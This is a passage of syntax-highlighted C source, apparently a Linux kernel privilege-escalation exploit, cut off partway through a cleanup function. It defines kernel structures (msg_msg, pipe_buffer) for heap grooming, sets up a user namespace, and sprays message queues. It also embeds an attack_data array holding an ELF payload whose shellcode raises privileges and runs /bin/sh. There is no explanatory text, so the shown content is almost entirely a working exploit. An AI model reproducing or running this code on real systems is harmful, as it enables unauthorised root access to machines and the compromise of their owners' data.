<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">logdebug</span><span class="token expression"><span class="token punctuation">(</span>fmt<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token function">dprintf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> </span><span class="token string">"\033[32m[*] "</span> <span class="token expression">fmt </span><span class="token string">"\033[0m\n"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token punctuation">##</span><span class="token expression">__VA_ARGS__<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">loginfo</span><span class="token expression"><span class="token punctuation">(</span>fmt<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token function">dprintf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> </span><span class="token string">"\033[34m[+] "</span> <span class="token expression">fmt </span><span class="token string">"\033[0m\n"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token punctuation">##</span><span class="token expression">__VA_ARGS__<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">logerror</span><span class="token expression"><span class="token punctuation">(</span>fmt<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token function">dprintf</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> </span><span class="token string">"\033[31m[-] "</span> <span class="token expression">fmt </span><span class="token string">"\033[0m\n"</span><span class="token expression"><span class="token punctuation">,</span> </span><span class="token punctuation">##</span><span class="token expression">__VA_ARGS__<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">die</span><span class="token expression"><span class="token punctuation">(</span>fmt<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>                      </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token keyword">do</span>                                       </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token punctuation">&#123;</span>                                        </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token function">logerror</span><span class="token punctuation">(</span>fmt<span class="token punctuation">,</span> </span><span class="token punctuation">##</span><span class="token expression">__VA_ARGS__<span class="token punctuation">)</span><span class="token punctuation">;</span>          </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token function">logerror</span><span class="token punctuation">(</span></span><span class="token string">"Exit at line %d"</span><span class="token expression"><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token function">write</span><span class="token punctuation">(</span>notify_pipe<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> </span><span class="token string">"N"</span><span class="token expression"><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         </span><span class="token punctuation">\</span>
    <span class="token expression"><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></span></span>

<span class="token keyword">struct</span> <span class="token class-name">list_head</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">uint64_t</span> next<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> prev<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">msg_msg</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">list_head</span> m_list<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> m_type<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> m_ts<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> next<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> security<span class="token punctuation">;</span>
  <span class="token keyword">char</span> mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">msg_msgseg</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">uint64_t</span> next<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">typ_msg</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> mtype<span class="token punctuation">;</span>
  <span class="token keyword">char</span> mtext<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">pipe_buffer</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">uint64_t</span> page<span class="token punctuation">;</span>
  <span class="token class-name">uint32_t</span> offset<span class="token punctuation">;</span>
  <span class="token class-name">uint32_t</span> len<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> ops<span class="token punctuation">;</span>
  <span class="token class-name">uint32_t</span> flags<span class="token punctuation">;</span>
  <span class="token class-name">uint32_t</span> pad<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> private<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">pipe_buf_operations</span>
<span class="token punctuation">&#123;</span>
  <span class="token class-name">uint64_t</span> confirm<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> release<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> steal<span class="token punctuation">;</span>
  <span class="token class-name">uint64_t</span> get<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">char</span> msg_buffer<span class="token punctuation">[</span><span class="token number">0x2000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> skb<span class="token punctuation">[</span><span class="token number">1024</span> <span class="token operator">-</span> SKB_SHARED_INFO_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">typ_msg</span> <span class="token operator">*</span>msg_a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">typ_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>msg_buffer<span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">typ_msg</span> <span class="token operator">*</span>msg_b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">typ_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>msg_buffer<span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">typ_msg</span> <span class="token operator">*</span>msg_a_oob <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">typ_msg</span> <span class="token operator">*</span><span class="token punctuation">)</span>msg_buffer<span class="token punctuation">;</span>
<span class="token keyword">int</span> sock_pairs<span class="token punctuation">[</span>NUM_SOCKETS<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> msqid_1<span class="token punctuation">[</span>NUM_MSQIDS_1<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> msqid_2<span class="token punctuation">[</span>NUM_MSQIDS_2<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> pipe_fd<span class="token punctuation">[</span>NUM_PIPEFDS<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> notify_pipe<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token class-name">uint64_t</span> kmalloc_1024<span class="token punctuation">;</span>
<span class="token keyword">int</span> corrupted_msqid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> uaf_msqid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> fake_msqid<span class="token punctuation">;</span>
<span class="token keyword">int</span> tfd<span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token keyword">char</span> attack_data<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token number">0x7f</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span>
    <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x3e</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0xb0</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span>
    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xe5</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span>
    <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xd2</span><span class="token punctuation">,</span>
    <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xd2</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span>
    <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xb8</span><span class="token punctuation">,</span> <span class="token number">0x2f</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span>
    <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x6e</span><span class="token punctuation">,</span> <span class="token number">0x2f</span><span class="token punctuation">,</span> <span class="token number">0x2f</span><span class="token punctuation">,</span> <span class="token number">0x2f</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xe7</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span>
    <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span>
    <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x5e</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xe6</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0xe6</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span>
    <span class="token number">0xd2</span><span class="token punctuation">,</span> <span class="token number">0x6a</span><span class="token punctuation">,</span> <span class="token number">0x3b</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x0f</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">init_unshare</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> fd<span class="token punctuation">;</span>
  <span class="token keyword">char</span> buff<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token comment">// strace from `unshare -Ur xxx`</span>
  <span class="token function">unshare</span><span class="token punctuation">(</span>CLONE_NEWNS <span class="token operator">|</span> CLONE_NEWUSER<span class="token punctuation">)</span><span class="token punctuation">;</span>

  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/setgroups"</span><span class="token punctuation">,</span> O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">snprintf</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"deny"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>

  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/uid_map"</span><span class="token punctuation">,</span> O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">snprintf</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"0 %d 1"</span><span class="token punctuation">,</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>

  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/proc/self/gid_map"</span><span class="token punctuation">,</span> O_WRONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">snprintf</span><span class="token punctuation">(</span>buff<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"0 %d 1"</span><span class="token punctuation">,</span> <span class="token function">getgid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buff<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buff<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">init_msg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_1<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> IPC_CREAT <span class="token operator">|</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgget() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_2<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>msqid_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">msgget</span><span class="token punctuation">(</span>IPC_PRIVATE<span class="token punctuation">,</span> IPC_CREAT <span class="token operator">|</span> <span class="token number">0666</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
      <span class="token function">die</span><span class="token punctuation">(</span><span class="token string">"msgget() error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">clean_msg_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_1<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid_1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_a<span class="token punctuation">,</span> MSG_A_TEXT_SIZE<span class="token punctuation">,</span> MTYPE_A<span class="token punctuation">,</span> IPC_NOWAIT<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">clean_msg_2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> NUM_MSQIDS_2<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">msgrcv</span><span class="token punctuation">(</span>msqid_2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> msg_b<span class="token punctuation">,</span> <span class="token number">64</span> <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">msg_msg</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MTYPE_B1<span class="token punctuation">,</span>
           IPC_NOWAIT<span class="token punctuation">)</span><span class="token punctuation">;</span>
